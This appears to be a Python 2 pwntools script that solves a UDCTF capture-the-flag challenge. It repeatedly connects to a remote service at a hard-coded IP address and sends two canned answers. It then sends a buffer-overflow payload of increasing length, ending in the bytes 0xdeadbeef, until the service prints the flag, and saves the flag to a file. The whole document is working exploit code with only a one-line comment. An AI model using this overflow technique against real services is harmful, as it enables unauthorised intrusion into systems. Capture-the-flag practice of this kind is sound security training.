# coding: utf-8
# %load hack_you_got_beef.py
from pwn import *
from Crypto.Util.number import *
import re

def red(prt):
    return "\033[91m{}\033[00m".format(prt)
def grn(prt):
    return "\033[92m{}\033[00m".format(prt)
def cyn(prt):
    return "\033[96m{}\033[00m".format(prt)
def flag(stuff):
    inner = re.search(r"\{.+\}", stuff).group()
    return  stuff.replace('UDCTF', cyn('UDCTF')).replace(inner.strip('{}'), red(inner.strip('{}'))).replace('{', grn('{')).replace('}', grn('}'))

def save(obj, filename):
    with open(filename, 'wb') as f:
        f.write(obj)

def s(stuff, condition, status):
    if status == 'send':
        print 'sending:', stuff
        r.sendline(stuff)
    msg = ''
    while condition not in msg and 'UDCTF' not in msg:
        while r.can_recv(timeout=0.1):
            msg += r.recv()
    print 'recv:', msg # [-50:]
    return msg

# from binary we see that 0xdeadbeef is checked after 43 bytes to spit out flag
check = '\xef\xbe\xad\xde'
cond = '\n'

found = False
i = 40
while not found:
    r = remote('3.220.181.160', 6004)
    m = s('', cond, '')
    m = s('Sir Lancelot of Camelot', cond, 'send')    
    m = s('To seek the Holy Grail.', cond, 'send')
    payload = 'A'*i +  '\xef\xbe\xad\xde'
    m = s(payload, cond, 'send')
    i += 1
    if 'UDCTF' in m:
        break
    r.close()
    
temp = 'UDCTF{' + m.split('UDCTF{')[1].split('}')[0] + '}'
print 'FLAG:', flag(temp)
save(flag(temp), 'flag.txt')
